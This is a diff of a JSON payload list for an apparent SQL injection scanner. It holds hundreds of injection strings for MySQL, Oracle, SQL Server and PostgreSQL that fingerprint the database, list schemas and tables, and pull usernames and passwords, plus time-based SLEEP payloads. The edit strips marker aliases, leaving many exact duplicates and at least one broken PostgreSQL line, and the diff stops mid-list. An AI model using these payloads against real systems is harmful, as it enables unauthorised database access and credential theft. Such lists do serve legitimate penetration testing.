@@ -7,18 +7,18 @@
         "' OR 1=1 LIMIT 1-- ",
         "' UNION SELECT NULL-- ",
         "' UNION SELECT 1,2-- ",
-        "' UNION SELECT user() AS {marker}-- ",
-        "' UNION SELECT database() AS {marker}-- ",
-        "' UNION SELECT version() AS {marker}-- ",
-        "' UNION SELECT table_name FROM information_schema.tables AS {marker}-- ",
+        "' UNION SELECT user()-- ",
+        "' UNION SELECT database()-- ",
+        "' UNION SELECT version()-- ",
+        "' UNION SELECT table_name FROM information_schema.tables-- ",
         "' AND 1=1 UNION SELECT NULL, NULL FROM dual-- ",
-        "' UNION SELECT current_user() AS {marker}-- ",
-        "' OR 1=1 UNION SELECT group_concat(table_name) AS {marker} FROM information_schema.tables-- ",
-        "' OR 1=1 UNION SELECT group_concat(column_name) AS {marker} FROM information_schema.columns WHERE table_name='users'-- ",
-        "' UNION SELECT NULL, NULL AS {marker} FROM dual-- ",
-        "' OR 1=1 UNION SELECT null, schema_name AS {marker} FROM information_schema.schemata-- ",
+        "' UNION SELECT current_user()-- ",
+        "' OR 1=1 UNION SELECT group_concat(table_name) FROM information_schema.tables-- ",
+        "' OR 1=1 UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- ",
+        "' UNION SELECT NULL, NULL FROM dual-- ",
+        "' OR 1=1 UNION SELECT null, schema_name FROM information_schema.schemata-- ",
         "' OR 1=1 AND SLEEP(5)-- ",
-        "' UNION SELECT NULL, group_concat(table_name) AS {marker} FROM information_schema.tables WHERE table_schema='mysql'-- ",
+        "' UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema='mysql'-- ",
         "SELECT SCHEMA_NAME FROM(INFORMATION_SCHEMA.SCHEMATA) LIMIT 0,1-- ",
         "SELECT IFNULL(SCHEMA_NAME,0x20) FROM(INFORMATION_SCHEMA.SCHEMATA) LIMIT 0,1-- ",
         "SELECT CONCAT(SCHEMA_NAME) FROM(INFORMATION_SCHEMA.SCHEMATA) LIMIT 0,1-- ",
@@ -86,321 +86,320 @@
         "AND (SELECT 8493 FROM (SELECT(SLEEP(360000)))ezNU)-- "
     ],
     "gbkquotes": [
-        "%bf'{marker}",
-        "%bf\"{marker}"
+        "%bf'",
+        "%bf\""
     ],
     "allalpha": [
-        "n \"{marker}", "o '{marker}", "i '{marker}", "z \"{marker}", "s \"{marker}", "l \"{marker}", "m \"{marker}", "o \"{marker}",
-        "q '{marker}", "v \"{marker}", "d '{marker}", "r \"{marker}", "t '{marker}", "j \"{marker}", "r '{marker}", "b '{marker}",
-        "h \"{marker}", "q \"{marker}", "k \"{marker}", "p '{marker}", "v '{marker}", "b \"{marker}", "f \"{marker}", "a '{marker}",
-        "a \"{marker}", "w \"{marker}", "d \"{marker}", "y '{marker}", "u '{marker}", "x \"{marker}", "x '{marker}", "f '{marker}",
-        "w '{marker}", "m '{marker}", "e \"{marker}", "s '{marker}", "g '{marker}", "g \"{marker}", "l '{marker}", "c '{marker}",
-        "c \"{marker}", "n '{marker}", "p \"{marker}", "e '{marker}", "z '{marker}", "i \"{marker}", "k '{marker}", "j '{marker}",
-        "t \"{marker}", "h '{marker}", "y \"{marker}"
+        "n \"", "o '", "i '", "z \"", "s \"", "l \"", "m \"", "o \"",
+        "q '", "v \"", "d '", "r \"", "t '", "j \"", "r '", "b '",
+        "h \"", "q \"", "k \"", "p '", "v '", "b \"", "f \"", "a '",
+        "a \"", "w \"", "d \"", "y '", "u '", "x \"", "x '", "f '",
+        "w '", "m '", "e \"", "s '", "g '", "g \"", "l '", "c '",
+        "c \"", "n '", "p \"", "e '", "z '", "i \"", "k '", "j '",
+        "t \"", "h '", "y \""
     ],
     "union": [
-        "' UNION SELECT null, null, null AS {marker}-- ",
-        "' UNION SELECT null, null, null AS {marker}-- ",
-        "' UNION SELECT null, null, null AS {marker}# ",
-        "' UNION SELECT null, null, null AS {marker}/* ",
-        "' UNION SELECT username, password AS {marker} FROM users-- ",
-        "' UNION SELECT username, password AS {marker} FROM users-- ",
-        "' UNION SELECT username, password AS {marker} FROM users# ",
-        "' UNION SELECT username, password AS {marker} FROM users/* ",
-        "' UNION SELECT user(), password AS {marker} FROM users-- ",
-        "' UNION SELECT user(), password AS {marker} FROM users-- ",
-        "' UNION SELECT user(), password AS {marker} FROM users# ",
-        "' UNION SELECT user(), password AS {marker} FROM users/* ",
-        "' UNION SELECT database(), version() AS {marker} FROM dual-- ",
-        "' UNION SELECT database(), version() AS {marker} FROM dual-- ",
-        "' UNION SELECT database(), version() AS {marker} FROM dual# ",
-        "' UNION SELECT database(), version() AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, CURRENT_USER() AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, CURRENT_USER() AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, CURRENT_USER() AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, CURRENT_USER() AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT password FROM users' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT password FROM users' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT password FROM users' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT password FROM users' AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT * FROM employees' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM employees' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM employees' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT * FROM employees' AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT * FROM users' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM users' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM users' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT * FROM users' AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT * FROM orders' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM orders' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM orders' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT * FROM orders' AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT * FROM products' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM products' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM products' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT * FROM products' AS {marker} FROM dual/* ",
-        "' UNION SELECT null, null, 'SELECT * FROM suppliers' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM suppliers' AS {marker} FROM dual-- ",
-        "' UNION SELECT null, null, 'SELECT * FROM suppliers' AS {marker} FROM dual# ",
-        "' UNION SELECT null, null, 'SELECT * FROM suppliers' AS {marker} FROM dual/* "
+        "' UNION SELECT null, null, null-- ",
+        "' UNION SELECT null, null, null-- ",
+        "' UNION SELECT null, null, null-- ",
+        "' UNION SELECT null, null, null-- ",
+        "' UNION SELECT username, password FROM users-- ",
+        "' UNION SELECT username, password FROM users-- ",
+        "' UNION SELECT username, password FROM users-- ",
+        "' UNION SELECT username, password FROM users-- ",
+        "' UNION SELECT user(), password FROM users-- ",
+        "' UNION SELECT user(), password FROM users-- ",
+        "' UNION SELECT user(), password FROM users-- ",
+        "' UNION SELECT user(), password FROM users-- ",
+        "' UNION SELECT database(), version() FROM dual-- ",
+        "' UNION SELECT database(), version() FROM dual-- ",
+        "' UNION SELECT database(), version() FROM dual-- ",
+        "' UNION SELECT database(), version() FROM dual-- ",
+        "' UNION SELECT null, null, CURRENT_USER() FROM dual-- ",
+        "' UNION SELECT null, null, CURRENT_USER() FROM dual-- ",
+        "' UNION SELECT null, null, CURRENT_USER() FROM dual-- ",
+        "' UNION SELECT null, null, CURRENT_USER() FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT password FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT password FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT password FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT password FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM employees' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM employees' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM employees' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM employees' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM users' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM orders' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM orders' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM orders' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM orders' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM products' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM products' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM products' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM products' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM suppliers' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM suppliers' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM suppliers' FROM dual-- ",
+        "' UNION SELECT null, null, 'SELECT * FROM suppliers' FROM dual-- "
     ],
     "banner": {
         "MySQL": [
-            "' UNION SELECT CONCAT(@@version, 'DBMS_MARKER')-- ",
-            "' UNION SELECT CONCAT(VERSION(), 'DBMS_MARKER')-- "
+            "' UNION SELECT CONCAT(@@version, 'DBMS')-- ",
+            "' UNION SELECT CONCAT(VERSION(), 'DBMS')-- "
         ],
         "Oracle": [
-            "' UNION SELECT CONCAT(banner, 'DBMS_MARKER') FROM v$version WHERE ROWNUM=1-- ",
-            "' UNION SELECT CONCAT(version, 'DBMS_MARKER') FROM v$instance-- ",
-            "' UNION SELECT CONCAT(banner, 'DBMS_MARKER') FROM v$version WHERE banner LIKE 'Oracle%'-- "
+            "' UNION SELECT CONCAT(banner, 'DBMS') FROM v$version WHERE ROWNUM=1-- ",
+            "' UNION SELECT CONCAT(version, 'DBMS') FROM v$instance-- ",
+            "' UNION SELECT CONCAT(banner, 'DBMS') FROM v$version WHERE banner LIKE 'Oracle%'-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT CONCAT(@@VERSION, 'DBMS_MARKER')-- ",
+            "' UNION SELECT CONCAT(@@VERSION, 'DBMS')-- ",
             "' UNION SELECT CONCAT('Microsoft SQL Server Version: ', @@VERSION)-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT CONCAT(VERSION(), 'DBMS_MARKER')-- ",
-            "' UNION SELECT CONCAT(version(), 'DBMS_MARKER')-- "
+            "' UNION SELECT CONCAT(VERSION(), 'DBMS')-- ",
+            "' UNION SELECT CONCAT(version(), 'DBMS')-- "
         ]
     },
     "current_user": {
         "MySQL": [
-            "' UNION SELECT CURRENT_USER() AS {marker}-- "
+            "' UNION SELECT CURRENT_USER()-- "
         ],
         "Oracle": [
-            "' UNION SELECT USER AS {marker} FROM DUAL-- "
+            "' UNION SELECT USER FROM DUAL-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT SYSTEM_USER AS {marker}-- ",
-            "' UNION SELECT USER_NAME() AS {marker}-- ",
-            "' UNION SELECT loginame AS {marker} FROM master..sysprocesses WHERE spid=@@SPID-- "
+            "' UNION SELECT SYSTEM_USER-- ",
+            "' UNION SELECT USER_NAME()-- ",
+            "' UNION SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT CURRENT_USER AS {marker}-- ",
-            "' UNION SELECT usename AS {marker} FROM pg_user-- ",
-            "' UNION SELECT user AS {marker}-- ",
-            "' UNION SELECT session_user AS {marker}-- ",
-            "' UNION SELECT getpgusername() AS {marker}-- "
+            "' UNION SELECT CURRENT_USER-- ",
+            "' UNION SELECT usename FROM pg_user-- ",
+            "' UNION SELECT user-- ",
+            "' UNION SELECT session_user-- ",
+            "' UNION SELECT getpgusername()-- "
         ]
     },
     "current_database": {
         "MySQL": [
-            "' UNION SELECT DATABASE() AS {marker}-- ",
-            "' UNION SELECT SCHEMA() AS {marker}-- ",
-            "' UNION SELECT SCHEMA() AS {marker}-- ",
-            "' UNION SELECT DATABASE() AS {marker}-- ",
-            "' UNION SELECT DATABASE() AS {marker}-- "
+            "' UNION SELECT DATABASE()-- ",
+            "' UNION SELECT SCHEMA()-- ",
+            "' UNION SELECT SCHEMA()-- ",
+            "' UNION SELECT DATABASE()-- ",
+            "' UNION SELECT DATABASE()-- "
         ],
         "Oracle": [
-            "' UNION SELECT USER AS {marker} FROM DUAL-- ",
-            "' UNION SELECT SYS.DATABASE_NAME AS {marker} FROM DUAL-- ",
-            "' UNION SELECT global_name AS {marker} FROM global_name-- ",
-            "' UNION SELECT name AS {marker} FROM v$database-- ",
-            "' UNION SELECT instance_name AS {marker} FROM v$instance-- "
+            "' UNION SELECT USER FROM DUAL-- ",
+            "' UNION SELECT SYS.DATABASE_NAME FROM DUAL-- ",
+            "' UNION SELECT global_name FROM global_name-- ",
+            "' UNION SELECT name FROM v$database-- ",
+            "' UNION SELECT instance_name FROM v$instance-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT DB_NAME() AS {marker}-- ",
-            "' UNION SELECT DB_NAME() AS {marker}-- "
+            "' UNION SELECT DB_NAME()-- ",
+            "' UNION SELECT DB_NAME()-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT CURRENT_SCHEMA() AS {marker}-- ",
-            "' UNION SELECT current_database() AS {marker}-- "
+            "' UNION SELECT CURRENT_SCHEMA()-- ",
+            "' UNION SELECT current_database()-- "
         ]
     },
     "hostname": {
         "MySQL": [
-            "' UNION SELECT @@HOSTNAME AS {marker}-- "
+            "' UNION SELECT @@HOSTNAME-- "
         ],
         "Oracle": [
-            "' UNION SELECT UTL_INADDR.GET_HOST_NAME AS {marker} FROM DUAL-- ",
-            "' UNION SELECT host_name AS {marker} FROM v$instance-- "
+            "' UNION SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL-- ",
+            "' UNION SELECT host_name FROM v$instance-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT @@SERVERNAME AS {marker}-- ",
-            "' UNION SELECT HOST_NAME() AS {marker}-- ",
-            "' UNION SELECT HOST_NAME() AS {marker}-- "
+            "' UNION SELECT @@SERVERNAME-- ",
+            "' UNION SELECT HOST_NAME()-- ",
+            "' UNION SELECT HOST_NAME()-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT CONCAT(boot_val, 'DBMS_MARKER') AS {marker} FROM pg_settings WHERE name='listen_addresses' GROUP BY boot_val-- ",
-            "' UNION SELECT inet_server_addr() AS {marker}-- "
+            "' UNION SELECT CONCAT(boot_val, 'DBMS') AS FROM pg_settings WHERE name='listen_addresses' GROUP BY boot_val-- ",
+            "' UNION SELECT inet_server_addr()-- "
         ]
     },
     "dbs_count": {
         "MySQL": [
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db}'-- ",
-            "'/*!50000SELECT*/ COUNT(*) /*!50000FROM*/ INFORMATION_SCHEMA.SCHEMATA AS {marker}-- "
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db}'-- ",
+            "'/*!50000SELECT*/ COUNT(*) /*!50000FROM*/ INFORMATION_SCHEMA.SCHEMATA-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT COUNT(DISTINCT(schemaname)) AS {marker} FROM pg_tables-- ",
-            "' UNION SELECT COUNT(TABLE_SCHEMA) AS {marker} FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA-- ",
-            "' UNION SELECT COUNT(DISTINCT(schemaname)) AS {marker} FROM pg_tables GROUP BY SCHEMANAME-- ",
-            "' UNION SELECT COUNT(SCHEMANAME) AS {marker} FROM pg_tables GROUP BY SCHEMANAME-- ",
-            "' UNION SELECT COUNT(datname) AS {marker} FROM pg_database-- "
+            "' UNION SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables-- ",
+            "' UNION SELECT COUNT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA-- ",
+            "' UNION SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables GROUP BY SCHEMANAME-- ",
+            "' UNION SELECT COUNT(SCHEMANAME) FROM pg_tables GROUP BY SCHEMANAME-- ",
+            "' UNION SELECT COUNT(datname) FROM pg_database-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT LTRIM(STR(COUNT(name))) AS {marker} FROM master..sysdatabases-- ",
-            "' UNION SELECT COUNT(name) AS {marker} FROM master..sysdatabases-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM sys.databases-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM sys.databases-- ",
-            "' UNION SELECT CAST(COUNT(name) AS NVARCHAR(4000)) AS {marker} FROM master..sysdatabases-- ",
-            "' UNION SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)), CHAR(32)) AS {marker} FROM master..sysdatabases-- "
+            "' UNION SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases-- ",
+            "' UNION SELECT COUNT(name) FROM master..sysdatabases-- ",
+            "' UNION SELECT COUNT(*) FROM sys.databases-- ",
+            "' UNION SELECT COUNT(*) FROM sys.databases-- ",
+            "' UNION SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM master..sysdatabases-- ",
+            "' UNION SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)), CHAR(32)) FROM master..sysdatabases-- "
         ],
         "Oracle": [
-            "' UNION SELECT COUNT(DISTINCT(OWNER)) AS {marker} FROM SYS.ALL_TABLES-- "
+            "' UNION SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES-- "
         ]
     },
     "dbs_names": {
         "MySQL": [
-            "' UNION SELECT SCHEMA_NAME AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
-            "' UNION SELECT IFNULL(SCHEMA_NAME, ' ') AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT(SCHEMA_NAME) AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT/**_**/(SCHEMA_NAME) AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT_WS('(', '~', SCHEMA_NAME) AS {marker} FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
-            "'/*!SELECT*/ CONCAT_WS('(', '~', /*!SCHEMA_NAME*/) AS {marker} FROM /*!INFORMATION_SCHEMA*/./*!SCHEMATA*/ LIMIT 0,1-- "
+            "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
+            "' UNION SELECT IFNULL(SCHEMA_NAME, ' ') FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT/**_**/(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT_WS('(', '~', SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1-- ",
+            "'/*!SELECT*/ CONCAT_WS('(', '~', /*!SCHEMA_NAME*/) FROM /*!INFORMATION_SCHEMA*/./*!SCHEMATA*/ LIMIT 0,1-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT DISTINCT(schemaname) AS {marker} FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT CONCAT(TABLE_SCHEMA) AS {marker} FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLE_SCHEMA AS {marker} FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT SCHEMANAME AS {marker} FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT CONCAT(SCHEMANAME) AS {marker} FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT datname AS {marker} FROM pg_database ORDER BY datname OFFSET 0 LIMIT 1-- "
+            "' UNION SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT SCHEMANAME FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT CONCAT(SCHEMANAME) FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT datname FROM pg_database ORDER BY datname OFFSET 0 LIMIT 1-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT TOP 1 name AS {marker} FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
-            "' UNION SELECT TOP 1 CAST(name AS NVARCHAR(4000)) AS {marker} FROM master..sysdatabases WHERE CAST(name AS NVARCHAR(4000)) NOT IN (SELECT TOP 0 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
-            "' UNION SELECT TOP 1 SUBSTRING(ISNULL(CAST(name AS NVARCHAR(4000)), ' '), 1, 1024) AS {marker} FROM master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)), ' ') NOT IN (SELECT TOP 3 ISNULL(CAST(name AS NVARCHAR(4000)), ' ') FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
-            "' UNION SELECT DB_NAME(0) AS {marker}-- "
+            "' UNION SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
+            "' UNION SELECT TOP 1 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases WHERE CAST(name AS NVARCHAR(4000)) NOT IN (SELECT TOP 0 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
+            "' UNION SELECT TOP 1 SUBSTRING(ISNULL(CAST(name AS NVARCHAR(4000)), ' '), 1, 1024) FROM master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)), ' ') NOT IN (SELECT TOP 3 ISNULL(CAST(name AS NVARCHAR(4000)), ' ') FROM master..sysdatabases ORDER BY name) ORDER BY name-- ",
+            "' UNION SELECT DB_NAME(0)-- "
         ],
         "Oracle": [
-            "' UNION SELECT OWNER AS {marker} FROM (SELECT OWNER, ROWNUM AS LIMIT FROM (SELECT DISTINCT OWNER FROM SYS.ALL_TABLES)) WHERE LIMIT=1-- "
+            "' UNION SELECT OWNER FROM (SELECT OWNER, ROWNUM AS LIMIT FROM (SELECT DISTINCT OWNER FROM SYS.ALL_TABLES)) WHERE LIMIT=1-- "
         ]
     },
     "tbls_count": {
         "MySQL": [
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}'-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '{db}'-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN ('{db}')-- ",
-            "'/*!50000SELECT*/ COUNT(*) /*!50000FROM*/ INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}' AS {marker}-- "
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}'-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '{db}'-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN ('{db}')-- ",
+            "'/*!50000SELECT*/ COUNT(*) /*!50000FROM*/ INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}'-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT COUNT(TABLENAME)::text AS {marker} FROM pg_tables WHERE SCHEMANAME='{db}'-- ",
-            "' UNION SELECT COUNT(TABLENAME)::text AS {marker} FROM pg_tables WHERE SCHEMANAME LIKE '{db}'-- ",
-            "' UNION SELECT COUNT(TABLENAME)::text AS {marker} FROM pg_tables WHERE SCHEMANAME IN ('{db}')-- ",
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- "
+            "' UNION SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME='{db}'-- ",
+            "' UNION SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME LIKE '{db}'-- ",
+            "' UNION SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME IN ('{db}')-- ",
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT LTRIM(STR(COUNT(name))) AS {marker} FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name='{tbl}')-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(COLUMN_NAME))) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(*))) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(*))) AS {marker} FROM {db}..sysobjects)-- -- -- "
+            "' UNION SELECT LTRIM(STR(COUNT(name))) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name='{tbl}')-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(COLUMN_NAME))) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(*))) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(*))) FROM {db}..sysobjects)-- -- -- "
         ],
         "Oracle": [
-            "' UNION SELECT COUNT(TABLE_NAME) AS {marker} FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}'-- "
+            "' UNION SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}'-- "
         ]
     },
     "tbls_names": {
         "MySQL": [
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM mysql.information_schema.tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM sqlite_master -- ",
-            "' UNION SELECT name, null AS {marker} FROM sysobjects WHERE type='U' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM pg_tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM INFORMATION_SCHEMA.tables WHERE table_schema = 'public' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM INFORMATION_SCHEMA.tables LIMIT 0, 10 -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_schema NOT LIKE 'mysql' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_schema='public' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_schema='information_schema' -- ",
-            "' UNION SELECT name, null AS {marker} FROM sqlite_master WHERE type='table' -- ",
